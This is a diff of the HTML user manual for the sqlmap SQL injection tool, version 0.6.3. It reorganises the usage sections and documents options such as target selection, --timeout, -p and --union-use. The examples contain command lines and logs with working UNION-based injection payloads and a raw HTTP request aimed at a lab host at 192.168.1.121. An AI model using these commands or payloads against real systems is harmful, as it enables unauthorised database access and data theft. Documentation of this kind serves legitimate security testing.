@@ -37,14 +37,15 @@ for the latest version.</EM>
 <H2><A NAME="toc5">5.</A> <A HREF="README.html#s5">Usage</A></H2>
 
 <UL>
-<LI><A NAME="toc5.1">5.1</A> <A HREF="README.html#ss5.1">Request</A>
-<LI><A NAME="toc5.2">5.2</A> <A HREF="README.html#ss5.2">Techniques</A>
+<LI><A NAME="toc5.1">5.1</A> <A HREF="README.html#ss5.1">Target</A>
+<LI><A NAME="toc5.2">5.2</A> <A HREF="README.html#ss5.2">Request</A>
 <LI><A NAME="toc5.3">5.3</A> <A HREF="README.html#ss5.3">Injection</A>
-<LI><A NAME="toc5.4">5.4</A> <A HREF="README.html#ss5.4">Fingerprint</A>
-<LI><A NAME="toc5.5">5.5</A> <A HREF="README.html#ss5.5">Enumeration</A>
-<LI><A NAME="toc5.6">5.6</A> <A HREF="README.html#ss5.6">File system access</A>
-<LI><A NAME="toc5.7">5.7</A> <A HREF="README.html#ss5.7">Operating system access</A>
-<LI><A NAME="toc5.8">5.8</A> <A HREF="README.html#ss5.8">Miscellaneous</A>
+<LI><A NAME="toc5.4">5.4</A> <A HREF="README.html#ss5.4">Techniques</A>
+<LI><A NAME="toc5.5">5.5</A> <A HREF="README.html#ss5.5">Fingerprint</A>
+<LI><A NAME="toc5.6">5.6</A> <A HREF="README.html#ss5.6">Enumeration</A>
+<LI><A NAME="toc5.7">5.7</A> <A HREF="README.html#ss5.7">File system access</A>
+<LI><A NAME="toc5.8">5.8</A> <A HREF="README.html#ss5.8">Operating system access</A>
+<LI><A NAME="toc5.9">5.9</A> <A HREF="README.html#ss5.9">Miscellaneous</A>
 </UL>
 <P>
 <H2><A NAME="toc6">6.</A> <A HREF="README.html#s6">Disclaimer</A></H2>
@@ -84,10 +85,13 @@ Windows users can download and install the Python setup-ready installer
 for x86, AMD64 and Itanium too.</P>
 <P>Optionally, if you are running sqlmap on Windows, you may wish to install
 <A HREF="http://ipython.scipy.org/moin/PyReadline/Intro">PyReadline</A>
-to be able to take advantage of the sqlmap TAB completion and history
-support functionalities in the SQL shell and OS shell.
+library to be able to take advantage of the sqlmap TAB completion and
+history support functionalities in the SQL shell and OS shell.
 Note that these functionalities are available natively by Python official
-readline library on other operating systems.</P>
+readline library on other operating systems.
+You can also choose to install 
+<A HREF="http://psyco.sourceforge.net/">Psyco</A>
+library to speed up the sqlmap algorithmic operations.</P>
 
 
 <H2><A NAME="ss1.2">1.2</A> <A HREF="#toc1.2">Scenario</A>
@@ -348,20 +352,25 @@ $ python sqlmap.py -h
 
     sqlmap/0.6.3 coded by Bernardo Damele A. G. &lt;bernardo.damele@gmail.com>
                         and Daniele Bellucci &lt;daniele.bellucci@gmail.com>
-    
-Usage: sqlmap.py [options] {-u "&lt;URL>" | -g "&lt;google dork>" | -c "&lt;config file>"}
+
+Usage: sqlmap.py [options]
 
 Options:
   --version             show program's version number and exit
   -h, --help            show this help message and exit
 
-  Request:
-    These options have to be specified to set the target url, HTTP method,
-    how to connect to the target url or Google dorking results in general.
+  Target:
+    At least one of these options has to be specified to set the source to
+    get target urls from.
 
     -u URL, --url=URL   Target url
+    -l LIST             Parse targets from Burp or WebScarab logs
     -g GOOGLEDORK       Process Google dork results as target urls
-    -p TESTPARAMETER    Testable parameter(s)
+    -c CONFIGFILE       Load options from a configuration INI file
+
+  Request:
+    These options can be used to specify how to connect to the target url.
+
     --method=METHOD     HTTP method, GET or POST (default: GET)
     --data=DATA         Data string to be sent through POST
     --cookie=COOKIE     HTTP Cookie header
@@ -373,8 +382,10 @@ Options:
     --proxy=PROXY       Use a HTTP proxy to connect to the target url
     --threads=THREADS   Maximum number of concurrent HTTP requests (default 1)
     --delay=DELAY       Delay in seconds between each HTTP request
+    --timeout=TIMEOUT   Seconds to wait before timeout connection (default 10)
 
   Injection:
+    -p TESTPARAMETER    Testable parameter(s)
     --string=STRING     String to match in page when the query is valid
     --dbms=DBMS         Force back-end DBMS to this value
 
@@ -385,11 +396,11 @@ Options:
 
     --time-test         Test for Time based blind SQL injection
     --union-test        Test for UNION query (inband) SQL injection
-    --union-use         Use the UNION query (inband) SQL injection to
-                        retrieve the queries output. No need to go blind
+    --union-use         Use the UNION query (inband) SQL injection to retrieve
+                        the queries output. No need to go blind
 
   Fingerprint:
-    -f, --fingerprint   Perform an extensive database fingerprint
+    -f, --fingerprint   Perform an extensive DBMS version fingerprint
 
   Enumeration:
     These options can be used to enumerate the back-end database
@@ -438,10 +449,9 @@ Options:
   Miscellaneous:
     --eta               Retrieve each query output length and calculate the
                         estimated time of arrival in real time
-    -v VERBOSE          Verbosity level: 0-5 (default 0)
+    -v VERBOSE          Verbosity level: 0-5 (default 1)
     --update            Update sqlmap to the latest stable version
     -s SESSIONFILE      Save and resume all data retrieved on a session file
-    -c CONFIGFILE       Load options from a configuration INI file
     --save              Save options on a configuration INI file
     --batch             Never ask for user input, use the default behaviour
 </PRE>
@@ -449,7 +459,7 @@ Options:
 </P>
 
 
-<H2><A NAME="ss5.1">5.1</A> <A HREF="#toc5.1">Request</A>
+<H2><A NAME="ss5.1">5.1</A> <A HREF="#toc5.1">Target</A>
 </H2>
 
 <H3>Target URL</H3>
@@ -675,7 +685,7 @@ Content-Type: text/html
 </P>
 
 
-<H3>List of targets</H3>
+<H3>Parse targets from Burp or WebScarab logs</H3>
 
 <P>Option: <CODE>-l</CODE></P>
 
@@ -725,90 +735,33 @@ want to test this url? [y/N/q] y
 </P>
 
 
-<H3>Testable parameter(s)</H3>
+<H3>Load options from a configuration INI file</H3>
 
-<P>Option: <CODE>-p</CODE></P>
+<P>Option: <CODE>-c</CODE></P>
 
-<P>By default sqlmap tests all <CODE>GET</CODE> parameters, <CODE>POST</CODE>
-parameters, HTTP <CODE>Cookie</CODE> header values and HTTP <CODE>User-Agent</CODE>
-header value for dynamicity and SQL injection vulnerability, but it is
-possible to manually specificy the parameter(s) you want sqlmap to perform
-tests on comma separeted in order to skip dynamicity tests and perform SQL
-injection test and inject directly only against the provided parameter(s).</P>
-<P>Example on a <B>PostgreSQL 8.2.7</B> target:</P>
-<P>
-<BLOCKQUOTE><CODE>
-<PRE>
-$ python sqlmap.py -u "http://192.168.1.121/sqlmap/pgsql/get_int.php?id=1&amp;cat=2" -v 1 \
-  -p "id"
-
-[hh:mm:48] [INFO] testing connection to the target url
-[hh:mm:48] [INFO] testing if the url is stable, wait a few seconds
-[hh:mm:49] [INFO] url is stable
-[hh:mm:49] [INFO] testing if GET parameter 'id' is dynamic
-[hh:mm:49] [INFO] confirming that GET parameter 'id' is dynamic
-[hh:mm:49] [INFO] GET parameter 'id' is dynamic
-[hh:mm:49] [INFO] testing sql injection on GET parameter 'id'
-[hh:mm:49] [INFO] testing numeric/unescaped injection on GET parameter 'id'
-[hh:mm:49] [INFO] confirming numeric/unescaped injection on GET parameter 'id'
-[hh:mm:49] [INFO] GET parameter 'id' is numeric/unescaped injectable
-[hh:mm:49] [INFO] testing for parenthesis on injectable parameter
-[hh:mm:49] [INFO] the injectable parameter requires 0 parenthesis
-[...]
-</PRE>
-</CODE></BLOCKQUOTE>
-</P>
-
-<P>Or, if you want to provide more than one parameter, for instance:</P>
-<P>
-<BLOCKQUOTE><CODE>
-<PRE>
-$ python sqlmap.py -u "http://192.168.1.121/sqlmap/pgsql/get_int.php?id=1&amp;cat=2" -v 1 \
-  -p "cat,id"
-</PRE>
-</CODE></BLOCKQUOTE>
-</P>
-
-<P>You can also test only the HTTP <CODE>User-Agent</CODE> header.</P>
+<P>It is possible to pass user's options from a configuration INI file, an
+example is <CODE>sqlmap.conf</CODE>.</P>
 
 <P>Example on a <B>MySQL 5.0.51</B> target:</P>
 <P>
 <BLOCKQUOTE><CODE>
 <PRE>
-$ python sqlmap.py -u "http://192.168.1.121/sqlmap/mysql/get_int.php?id=1&amp;cat=2" -v 1 \
-  -p "user-agent" --user-agent "sqlmap/0.6.3 (http://sqlmap.sourceforge.net)"
+$ python sqlmap.py -c "sqlmap.conf"
 
-[hh:mm:40] [WARNING] the testable parameter 'user-agent' you provided is not into the GET
-[hh:mm:40] [INFO] testing connection to the target url
-[hh:mm:40] [INFO] testing if the url is stable, wait a few seconds
-[hh:mm:41] [INFO] url is stable
-[hh:mm:41] [INFO] testing if User-Agent parameter 'User-Agent' is dynamic
-[hh:mm:41] [INFO] confirming that User-Agent parameter 'User-Agent' is dynamic
-[hh:mm:41] [INFO] User-Agent parameter 'User-Agent' is dynamic
-[hh:mm:41] [INFO] testing sql injection on User-Agent parameter 'User-Agent'
-[hh:mm:41] [INFO] testing numeric/unescaped injection on User-Agent parameter 'User-Agent'
-[hh:mm:41] [INFO] User-Agent parameter 'User-Agent' is not numeric/unescaped injectable
-[hh:mm:41] [INFO] testing string/single quote injection on User-Agent parameter 'User-Agent'
-[hh:mm:41] [INFO] confirming string/single quote injection on User-Agent parameter 'User-Agent'
-[hh:mm:41] [INFO] User-Agent parameter 'User-Agent' is string/single quote injectable
-[hh:mm:41] [INFO] testing for parenthesis on injectable parameter
-[hh:mm:41] [INFO] the injectable parameter requires 0 parenthesis
-[hh:mm:41] [INFO] testing MySQL
-[hh:mm:41] [INFO] query: CONCAT(CHAR(52), CHAR(52))
-[hh:mm:41] [INFO] retrieved: 44
-[hh:mm:41] [INFO] performed 20 queries in 0 seconds
-[hh:mm:41] [INFO] confirming MySQL
-[hh:mm:41] [INFO] query: LENGTH(CHAR(52))
-[hh:mm:41] [INFO] retrieved: 1
-[hh:mm:41] [INFO] performed 13 queries in 0 seconds
-[hh:mm:41] [INFO] query: SELECT 4 FROM information_schema.TABLES LIMIT 0, 1
-[hh:mm:41] [INFO] retrieved: 4
-[hh:mm:41] [INFO] performed 13 queries in 0 seconds
+[hh:mm:42] [WARNING] User-Agent parameter 'User-Agent' is not dynamic
+[hh:mm:42] [WARNING] GET parameter 'cat' is not dynamic
 back-end DBMS:  MySQL >= 5.0.0
 </PRE>
 </CODE></BLOCKQUOTE>
 </P>
 
+<P>Note that if you also provide other options from command line, those are
+evaluated when running sqlmap and overwrite the same options, if set, in
+the configuration file provided.</P>
+
+
+<H2><A NAME="ss5.2">5.2</A> <A HREF="#toc5.2">Request</A>
+</H2>
 
 <H3>HTTP method: <CODE>GET</CODE> or <CODE>POST</CODE></H3>
 
@@ -1213,162 +1166,102 @@ seven HTTP requests, the maximum to retrieve a query output character.</P>
 request. The valid value is a float, for instance 0.5.</P>
 
 
-<H2><A NAME="ss5.2">5.2</A> <A HREF="#toc5.2">Techniques</A>
+<H3>Seconds to wait before timeout connection</H3>
+
+<P>Option: <CODE>--timeout</CODE></P>
+
+<P>It is possible to specify a number of seconds to wait before considering
+the HTTP connection timed out. The valid value is a float, for instance
+10.5.</P>
+
+
+<H2><A NAME="ss5.3">5.3</A> <A HREF="#toc5.3">Injection</A>
 </H2>
 
-<H3>Test for Time Based Blind SQL injection</H3>
+<H3>Testable parameter(s)</H3>
 
-<P>Option: <CODE>--time-test</CODE></P>
+<P>Option: <CODE>-p</CODE></P>
 
-<P>TODO</P>
-
-
-<H3>Test for UNION query SQL injection</H3>
-
-<P>Option: <CODE>--union-test</CODE></P>
-
-<P>It is possible to test if the target URL is affected by an <B>inband
-SQL injection</B> vulnerability.
-Refer to the <EM>Techniques</EM> section for details on this SQL injection
-technique.</P>
-
-<P>Example on an <B>Oracle XE 10.2.0.1</B> target:</P>
-<P>
-<BLOCKQUOTE><CODE>
-<PRE>
-$ python sqlmap.py -u "http://192.168.1.121/sqlmap/oracle/get_int.php?id=1&amp;cat=2" \
-  --union-test -v 1
-
-[...]
-back-end DBMS:  Oracle
-
-[hh:mm:55] [INFO] testing inband sql injection on parameter 'id'
-[hh:mm:55] [INFO] the target url could be affected by an inband sql injection vulnerability
-valid union:    'http://192.168.1.121:80/sqlmap/oracle/get_int.php?id=1 UNION ALL SELECT 
-NULL, NULL, NULL FROM DUAL-- AND 5601=5601&amp;cat=2'
-</PRE>
-</CODE></BLOCKQUOTE>
-</P>
-
+<P>By default sqlmap tests all <CODE>GET</CODE> parameters, <CODE>POST</CODE>
+parameters, HTTP <CODE>Cookie</CODE> header values and HTTP <CODE>User-Agent</CODE>
+header value for dynamicity and SQL injection vulnerability, but it is
+possible to manually specificy the parameter(s) you want sqlmap to perform
+tests on comma separeted in order to skip dynamicity tests and perform SQL
+injection test and inject directly only against the provided parameter(s).</P>
 <P>Example on a <B>PostgreSQL 8.2.7</B> target:</P>
 <P>
 <BLOCKQUOTE><CODE>
 <PRE>
-$ python sqlmap.py -u "http://192.168.1.121/sqlmap/pgsql/get_str.php?id=1&amp;cat=2" \
-  --union-test -v 1
+$ python sqlmap.py -u "http://192.168.1.121/sqlmap/pgsql/get_int.php?id=1&amp;cat=2" -v 1 \
+  -p "id"
 
+[hh:mm:48] [INFO] testing connection to the target url
+[hh:mm:48] [INFO] testing if the url is stable, wait a few seconds
+[hh:mm:49] [INFO] url is stable
+[hh:mm:49] [INFO] testing if GET parameter 'id' is dynamic
+[hh:mm:49] [INFO] confirming that GET parameter 'id' is dynamic
+[hh:mm:49] [INFO] GET parameter 'id' is dynamic
+[hh:mm:49] [INFO] testing sql injection on GET parameter 'id'
+[hh:mm:49] [INFO] testing numeric/unescaped injection on GET parameter 'id'
+[hh:mm:49] [INFO] confirming numeric/unescaped injection on GET parameter 'id'
+[hh:mm:49] [INFO] GET parameter 'id' is numeric/unescaped injectable
+[hh:mm:49] [INFO] testing for parenthesis on injectable parameter
+[hh:mm:49] [INFO] the injectable parameter requires 0 parenthesis
 [...]
-back-end DBMS:  PostgreSQL
-
-[hh:mm:05] [INFO] testing inband sql injection on parameter 'id'
-[hh:mm:05] [INFO] the target url could be affected by an inband sql injection vulnerability
-valid union:    'http://192.168.1.121:80/sqlmap/pgsql/get_str.php?id=1' UNION ALL SELECT 
-NULL, NULL, NULL-- AND 'QOAtA'='QOAtA&amp;cat=2'
 </PRE>
 </CODE></BLOCKQUOTE>
 </P>
 
-<P>As you can see, the target URL parameter <CODE>id</CODE> might be also
-affected by an inband SQL injection.
-In case this vulnerability is exploitable it is strongly recommended to
-use it.</P>
-
-<H3>Use the UNION query SQL injection</H3>
-
-<P>Option: <CODE>--union-use</CODE></P>
-
-<P>Providing the <CODE>--union-use</CODE> parameter, sqlmap will first test if
-the target URL is affected by an <B>inband SQL injection</B>
-(<CODE>--union-test</CODE>) vulnerability then, in case it is vulnerable and
-exploitable, it will trigger this vulnerability to retrieve the output of
-the <CODE>SELECT</CODE> queries.</P>
-
-<P>Example on a <B>Microsoft SQL Server 2000 Service Pack 0</B> target:</P>
+<P>Or, if you want to provide more than one parameter, for instance:</P>
 <P>
 <BLOCKQUOTE><CODE>
 <PRE>
-$ python sqlmap.py -u "http://192.168.1.121/sqlmap/mssql/get_int.php?id=1&amp;cat=2" -v 1 \
-  --union-use --banner
-
-[...]
-back-end DBMS:  Microsoft SQL Server 2000
-
-[hh:mm:42] [INFO] fetching banner
-[hh:mm:42] [INFO] testing inband sql injection on parameter 'id'
-[hh:mm:42] [INFO] the target url could be affected by an inband sql injection vulnerability
-[hh:mm:42] [INFO] confirming inband sql injection on parameter 'id'
-[hh:mm:42] [INFO] the target url is affected by an exploitable inband sql injection 
-vulnerability
-[hh:mm:42] [INFO] query:  UNION ALL SELECT NULL, (CHAR(110)+CHAR(83)+CHAR(68)+CHAR(80)+
-CHAR(84)+CHAR(70))+ISNULL(CAST(@@VERSION AS VARCHAR(8000)), (CHAR(32)))+(CHAR(70)+CHAR(82)+
-CHAR(100)+CHAR(106)+CHAR(72)+CHAR(75)), NULL-- AND 5204=5204
-[hh:mm:42] [INFO] performed 3 queries in 0 seconds
-banner:
----
-Microsoft SQL Server  2000 - 8.00.194 (Intel X86) 
-        Aug  6 2000 00:57:48 
-        Copyright (c) 1988-2000 Microsoft Corporation
-        Standard Edition on Windows NT 5.0 (Build 2195: Service Pack 4)
----
+$ python sqlmap.py -u "http://192.168.1.121/sqlmap/pgsql/get_int.php?id=1&amp;cat=2" -v 1 \
+  -p "cat,id"
 </PRE>
 </CODE></BLOCKQUOTE>
 </P>
 
-<P>As you can see, the vulnerable parameter (<CODE>id</CODE>) is affected by both
-blind SQL injection and exploitable inband SQL injection vulnerabilities.</P>
+<P>You can also test only the HTTP <CODE>User-Agent</CODE> header.</P>
 
 <P>Example on a <B>MySQL 5.0.51</B> target:</P>
 <P>
 <BLOCKQUOTE><CODE>
 <PRE>
-$ python sqlmap.py -u "http://192.168.1.121/sqlmap/mysql/get_int.php?id=1&amp;cat=2" -v 5 \
-  --union-use --banner
+$ python sqlmap.py -u "http://192.168.1.121/sqlmap/mysql/ua_str.php" -v 1 \
+  -p "user-agent" --user-agent "sqlmap/0.6.3 (http://sqlmap.sourceforge.net)"
 
-[...]
-[hh:mm:25] [INFO] the target url is affected by an exploitable inband sql injection 
-vulnerability
-[hh:mm:25] [INFO] query:  UNION ALL SELECT NULL, CONCAT(CHAR(98,108,76,79,106,78),
-IFNULL(CAST(VERSION() AS CHAR(10000)), CHAR(32)),CHAR(122,110,105,89,121,65)), NULL-- 
-AND 6043=6043
-[hh:mm:25] [TRAFFIC OUT] HTTP request:
-GET /sqlmap/mysql/get_int.php?id=1%20UNION%20ALL%20SELECT%20NULL%2C%20CONCAT%28CHAR%2898
-%2C108%2C76%2C79%2C106%2C78%29%2CIFNULL%28CAST%28VERSION%28%29%20AS%20CHAR%2810000%29%29
-%2C%20CHAR%2832%29%29%2CCHAR%28122%2C110%2C105%2C89%2C121%2C65%29%29%2C%20NULL--%20AND%2
-06043=6043&amp;cat=2 HTTP/1.1
-Host: 192.168.1.121:80
-User-agent: sqlmap/0.6.3 (http://sqlmap.sourceforge.net)
-Connection: close
-
-[hh:mm:25] [TRAFFIC IN] HTTP response (OK - 200):
-Date: Mon, 28 Jul 2008 22:34:25 GMT
-Server: Apache/2.2.8 (Ubuntu) PHP/5.2.4-2ubuntu5.2 with Suhosin-Patch mod_ssl/2.2.8 
-OpenSSL/0.9.8g mod_perl/2.0.3 Perl/v5.8.8
-X-Powered-By: PHP/5.2.4-2ubuntu5.2
-Content-Length: 194
-Connection: close
-Content-Type: text/html
-
-&lt;html&gt;&lt;body&gt;
-&lt;b&gt;SQL results:&lt;/b&gt;
-&lt;table border="1"&gt;
-&lt;tr&gt;&lt;td&gt;1&lt;/td&gt;&lt;td&gt;luther&lt;/td&gt;&lt;td&gt;blissett&lt;/td&gt;&lt;/tr&gt;
-&lt;tr&gt;&lt;td&gt;&lt;/td&gt;&lt;td&gt;blLOjN5.0.51a-3ubuntu5.2zniYyA&lt;/td&gt;&lt;td&gt;&lt;/td&gt;&lt;/tr&gt;
-&lt;/table&gt;
-&lt;/body&gt;&lt;/html&gt;
-
-[hh:mm:25] [INFO] performed 3 queries in 0 seconds
-banner:    '5.0.51a-3ubuntu5.2'
+[hh:mm:40] [WARNING] the testable parameter 'user-agent' you provided is not into the GET
+[hh:mm:40] [INFO] testing connection to the target url
+[hh:mm:40] [INFO] testing if the url is stable, wait a few seconds
+[hh:mm:41] [INFO] url is stable
+[hh:mm:41] [INFO] testing if User-Agent parameter 'User-Agent' is dynamic
+[hh:mm:41] [INFO] confirming that User-Agent parameter 'User-Agent' is dynamic
+[hh:mm:41] [INFO] User-Agent parameter 'User-Agent' is dynamic
+[hh:mm:41] [INFO] testing sql injection on User-Agent parameter 'User-Agent'
+[hh:mm:41] [INFO] testing numeric/unescaped injection on User-Agent parameter 'User-Agent'
+[hh:mm:41] [INFO] User-Agent parameter 'User-Agent' is not numeric/unescaped injectable
+[hh:mm:41] [INFO] testing string/single quote injection on User-Agent parameter 'User-Agent'
+[hh:mm:41] [INFO] confirming string/single quote injection on User-Agent parameter 'User-Agent'
+[hh:mm:41] [INFO] User-Agent parameter 'User-Agent' is string/single quote injectable
+[hh:mm:41] [INFO] testing for parenthesis on injectable parameter
+[hh:mm:41] [INFO] the injectable parameter requires 0 parenthesis
+[hh:mm:41] [INFO] testing MySQL
+[hh:mm:41] [INFO] query: CONCAT(CHAR(52), CHAR(52))
+[hh:mm:41] [INFO] retrieved: 44
+[hh:mm:41] [INFO] performed 20 queries in 0 seconds
+[hh:mm:41] [INFO] confirming MySQL
+[hh:mm:41] [INFO] query: LENGTH(CHAR(52))
+[hh:mm:41] [INFO] retrieved: 1
+[hh:mm:41] [INFO] performed 13 queries in 0 seconds
+[hh:mm:41] [INFO] query: SELECT 4 FROM information_schema.TABLES LIMIT 0, 1
+[hh:mm:41] [INFO] retrieved: 4
+[hh:mm:41] [INFO] performed 13 queries in 0 seconds
+back-end DBMS:  MySQL >= 5.0.0
 </PRE>
 </CODE></BLOCKQUOTE>
 </P>
 
-<P>As you can see, the MySQL <CODE>version()</CODE> function (banner) output is
-nested (inband) within the HTTP response page, this makes the inband SQL
-injection exploitable.</P>
-
-
-<H2><A NAME="ss5.3">5.3</A> <A HREF="#toc5.3">Injection</A>
-</H2>
 
 <H3>String match</H3>
 
@@ -1564,7 +1457,161 @@ back-end database management system. If you do not know it, let sqlmap
 automatically identify it for you.</P>
 
 
-<H2><A NAME="ss5.4">5.4</A> <A HREF="#toc5.4">Fingerprint</A>
+<H2><A NAME="ss5.4">5.4</A> <A HREF="#toc5.4">Techniques</A>
+</H2>
+
+<H3>Test for Time Based blind SQL injection</H3>
+
+<P>Option: <CODE>--time-test</CODE></P>
+
+<P>TODO</P>
+
+
+<H3>Test for UNION query SQL injection</H3>
+
+<P>Option: <CODE>--union-test</CODE></P>
+
+<P>It is possible to test if the target URL is affected by an <B>inband
+SQL injection</B> vulnerability.
+Refer to the <EM>Techniques</EM> section for details on this SQL injection
+technique.</P>
+
+<P>Example on an <B>Oracle XE 10.2.0.1</B> target:</P>
+<P>
+<BLOCKQUOTE><CODE>
+<PRE>
+$ python sqlmap.py -u "http://192.168.1.121/sqlmap/oracle/get_int.php?id=1&amp;cat=2" \
+  --union-test -v 1
+
+[...]
+back-end DBMS:  Oracle
+
+[hh:mm:55] [INFO] testing inband sql injection on parameter 'id'
+[hh:mm:55] [INFO] the target url could be affected by an inband sql injection vulnerability
+valid union:    'http://192.168.1.121:80/sqlmap/oracle/get_int.php?id=1 UNION ALL SELECT 
+NULL, NULL, NULL FROM DUAL-- AND 5601=5601&amp;cat=2'
+</PRE>
+</CODE></BLOCKQUOTE>
+</P>
+
+<P>Example on a <B>PostgreSQL 8.2.7</B> target:</P>
+<P>
+<BLOCKQUOTE><CODE>
+<PRE>
+$ python sqlmap.py -u "http://192.168.1.121/sqlmap/pgsql/get_str.php?id=1&amp;cat=2" \
+  --union-test -v 1
+
+[...]
+back-end DBMS:  PostgreSQL
+
+[hh:mm:05] [INFO] testing inband sql injection on parameter 'id'
+[hh:mm:05] [INFO] the target url could be affected by an inband sql injection vulnerability
+valid union:    'http://192.168.1.121:80/sqlmap/pgsql/get_str.php?id=1' UNION ALL SELECT 
+NULL, NULL, NULL-- AND 'QOAtA'='QOAtA&amp;cat=2'
+</PRE>
+</CODE></BLOCKQUOTE>
+</P>
+
+<P>As you can see, the target URL parameter <CODE>id</CODE> might be also
+affected by an inband SQL injection.
+In case this vulnerability is exploitable it is strongly recommended to
+use it.</P>
+
+<H3>Use the UNION query SQL injection</H3>
+
+<P>Option: <CODE>--union-use</CODE></P>
+
+<P>Providing the <CODE>--union-use</CODE> parameter, sqlmap will first test if
+the target URL is affected by an <B>inband SQL injection</B>
+(<CODE>--union-test</CODE>) vulnerability then, in case it is vulnerable and
+exploitable, it will trigger this vulnerability to retrieve the output of
+the <CODE>SELECT</CODE> queries.</P>
+
+<P>Example on a <B>Microsoft SQL Server 2000 Service Pack 0</B> target:</P>
+<P>
+<BLOCKQUOTE><CODE>
+<PRE>
+$ python sqlmap.py -u "http://192.168.1.121/sqlmap/mssql/get_int.php?id=1&amp;cat=2" -v 1 \
+  --union-use --banner
+
+[...]
+back-end DBMS:  Microsoft SQL Server 2000
+
+[hh:mm:42] [INFO] fetching banner
+[hh:mm:42] [INFO] testing inband sql injection on parameter 'id'
+[hh:mm:42] [INFO] the target url could be affected by an inband sql injection vulnerability
+[hh:mm:42] [INFO] confirming inband sql injection on parameter 'id'
+[hh:mm:42] [INFO] the target url is affected by an exploitable inband sql injection 
+vulnerability
+[hh:mm:42] [INFO] query:  UNION ALL SELECT NULL, (CHAR(110)+CHAR(83)+CHAR(68)+CHAR(80)+
+CHAR(84)+CHAR(70))+ISNULL(CAST(@@VERSION AS VARCHAR(8000)), (CHAR(32)))+(CHAR(70)+CHAR(82)+
+CHAR(100)+CHAR(106)+CHAR(72)+CHAR(75)), NULL-- AND 5204=5204
+[hh:mm:42] [INFO] performed 3 queries in 0 seconds
+banner:
+---
+Microsoft SQL Server  2000 - 8.00.194 (Intel X86) 
+        Aug  6 2000 00:57:48 
+        Copyright (c) 1988-2000 Microsoft Corporation
+        Standard Edition on Windows NT 5.0 (Build 2195: Service Pack 4)
+---
+</PRE>
+</CODE></BLOCKQUOTE>
+</P>
+
+<P>As you can see, the vulnerable parameter (<CODE>id</CODE>) is affected by both
+blind SQL injection and exploitable inband SQL injection vulnerabilities.</P>
+
+<P>Example on a <B>MySQL 5.0.51</B> target:</P>
+<P>
+<BLOCKQUOTE><CODE>
+<PRE>
+$ python sqlmap.py -u "http://192.168.1.121/sqlmap/mysql/get_int.php?id=1&amp;cat=2" -v 5 \
+  --union-use --banner
+
+[...]
+[hh:mm:25] [INFO] the target url is affected by an exploitable inband sql injection 
+vulnerability
+[hh:mm:25] [INFO] query:  UNION ALL SELECT NULL, CONCAT(CHAR(98,108,76,79,106,78),
+IFNULL(CAST(VERSION() AS CHAR(10000)), CHAR(32)),CHAR(122,110,105,89,121,65)), NULL-- 
+AND 6043=6043
+[hh:mm:25] [TRAFFIC OUT] HTTP request:
+GET /sqlmap/mysql/get_int.php?id=1%20UNION%20ALL%20SELECT%20NULL%2C%20CONCAT%28CHAR%2898
+%2C108%2C76%2C79%2C106%2C78%29%2CIFNULL%28CAST%28VERSION%28%29%20AS%20CHAR%2810000%29%29
+%2C%20CHAR%2832%29%29%2CCHAR%28122%2C110%2C105%2C89%2C121%2C65%29%29%2C%20NULL--%20AND%2
+06043=6043&amp;cat=2 HTTP/1.1
+Host: 192.168.1.121:80
+User-agent: sqlmap/0.6.3 (http://sqlmap.sourceforge.net)
+Connection: close
+
+[hh:mm:25] [TRAFFIC IN] HTTP response (OK - 200):
+Date: Mon, 28 Jul 2008 22:34:25 GMT
+Server: Apache/2.2.8 (Ubuntu) PHP/5.2.4-2ubuntu5.2 with Suhosin-Patch mod_ssl/2.2.8 
+OpenSSL/0.9.8g mod_perl/2.0.3 Perl/v5.8.8
+X-Powered-By: PHP/5.2.4-2ubuntu5.2
+Content-Length: 194
+Connection: close
+Content-Type: text/html
+
+&lt;html&gt;&lt;body&gt;
+&lt;b&gt;SQL results:&lt;/b&gt;
+&lt;table border="1"&gt;
+&lt;tr&gt;&lt;td&gt;1&lt;/td&gt;&lt;td&gt;luther&lt;/td&gt;&lt;td&gt;blissett&lt;/td&gt;&lt;/tr&gt;
+&lt;tr&gt;&lt;td&gt;&lt;/td&gt;&lt;td&gt;blLOjN5.0.51a-3ubuntu5.2zniYyA&lt;/td&gt;&lt;td&gt;&lt;/td&gt;&lt;/tr&gt;
+&lt;/table&gt;
+&lt;/body&gt;&lt;/html&gt;
+
+[hh:mm:25] [INFO] performed 3 queries in 0 seconds
+banner:    '5.0.51a-3ubuntu5.2'
+</PRE>
+</CODE></BLOCKQUOTE>
+</P>
+
+<P>As you can see, the MySQL <CODE>version()</CODE> function (banner) output is
+nested (inband) within the HTTP response page, this makes the inband SQL
+injection exploitable.</P>
+
+
+<H2><A NAME="ss5.5">5.5</A> <A HREF="#toc5.5">Fingerprint</A>
 </H2>
 
 <H3>Extensive database management system fingerprint</H3>
@@ -1779,7 +1826,7 @@ parsing library that fetches data from Chip Andrews'
 <A HREF="http://www.sqlsecurity.com/FAQs/SQLServerVersionDatabase/tabid/63/Default.aspx">SQLSecurity.com site</A> and outputs it to the XML versions file.</P>
 
 
-<H2><A NAME="ss5.5">5.5</A> <A HREF="#toc5.5">Enumeration</A>
+<H2><A NAME="ss5.6">5.6</A> <A HREF="#toc5.6">Enumeration</A>
 </H2>
 
 <H3>Banner</H3>
@@ -2250,7 +2297,7 @@ databases tables, only the users' schema that the web application's user
 is connected to, which is always <CODE>public</CODE>.</P>
 
 
-<H3>Dump database tables entries</H3>
+<H3>Dump database table entries</H3>
 
 <P>Options: <CODE>--dump</CODE>, <CODE>-C</CODE>, <CODE>-T</CODE>, <CODE>-D</CODE>,
 <CODE>--start</CODE> and <CODE>--stop</CODE></P>
@@ -2349,8 +2396,8 @@ $ cat /software/sqlmap/output/192.168.1.121/dump/public/users.csv
 </CODE></BLOCKQUOTE>
 </P>
 
-<P>You can also provide the <CODE>--start</CODE> and/or the <CODE>--stop</CODE> option
-to limit the dump to a range of entries.</P>
+<P>You can also provide the <CODE>--start</CODE> and/or the <CODE>--stop</CODE>
+options to limit the dump to a range of entries.</P>
 <P>
 <UL>
 <LI><CODE>--start</CODE> specifies the first entry to enumerate</LI>
@@ -2859,7 +2906,7 @@ column names of the table then asks if the query can return multiple
 entries and goes on.</P>
 
 
-<H2><A NAME="ss5.6">5.6</A> <A HREF="#toc5.6">File system access</A>
+<H2><A NAME="ss5.7">5.7</A> <A HREF="#toc5.7">File system access</A>
 </H2>
 
 <H3>Read a specific file content</H3>
@@ -2867,8 +2914,8 @@ entries and goes on.</P>
 <P>Option: <CODE>--read-file</CODE></P>
 
 <P>If the back-end database management system is MySQL and the current user
-has access to the <CODE>LOAD_FILE()</CODE> function, it is possible to read
-the content of a specific file from the file system.</P>
